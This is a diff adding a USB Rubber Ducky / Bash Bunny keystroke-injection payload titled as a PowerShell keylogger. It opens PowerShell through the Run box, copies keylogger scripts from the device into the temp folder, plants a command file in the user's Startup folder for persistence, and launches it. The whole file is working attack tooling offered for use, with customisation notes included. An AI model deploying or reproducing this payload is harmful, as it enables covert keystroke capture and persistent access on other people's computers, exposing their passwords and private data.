@@ -1,0 +1,27 @@
+REM Powershell Keylogger for the USB RubberDucky
+REM created by : C0SM0
+
+REM STAGE1
+REM open runbox
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM STAGE 2
+REM move files to appropiate directories
+REM change 'BashBunny' to the name of your bash bunny
+REM change 'switch1' to switch position that stores the paylaod
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\l.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
+ENTER
+DELAY 200
+
+REM STAGE 3
+REM run keylogger
+STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\c.cmd;exit
+
+REM STAGE 4
+REM deploy
+ENTER
